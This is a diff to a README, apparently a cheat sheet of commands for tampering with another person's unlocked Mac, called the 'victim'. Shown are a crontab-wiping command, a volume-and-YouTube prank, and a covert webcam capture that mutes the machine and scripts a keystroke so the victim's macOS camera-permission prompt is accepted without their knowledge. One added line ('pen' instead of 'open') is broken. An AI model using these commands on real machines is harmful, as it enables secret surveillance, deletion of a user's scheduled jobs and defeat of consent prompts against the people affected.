@@ -75,7 +75,9 @@ echo "" | crontab - && crontab -r
 
 * Rick roll prank
 ```shell
-osascript -e 'set volume 7' && open https://www.youtube.com/watch?v=dQw4w9WgXcQ&frags=pl%2Cwn
+# One privilege of hacking Mac is we have access to applescript.
+osascript -e 'set volume 7'
+pen https://www.youtube.com/watch?v=dQw4w9WgXcQ
 ```
 
 * Accessing sudo privilege
@@ -90,10 +92,12 @@ screencapture ~/a.jpg
 
 * Take a photo with Mac's webcam
 ```shell
-# since brew does not require sudo privilege, if victim has brew, this works
+# Since brew does not require sudo privilege, if victim has brew, this works.
 brew install imagesnap
 osascript -e 'set volume 0'  # mute
 imagesnap ~/a.png
+osascript -e 'tell application "System Events" to delay 1' && / 
+osascript -e 'tell application "System Events" to keystroke return'  # Mac will ask for permission, make the victim hit enter!
 ```
 
 ## Author and Contributors
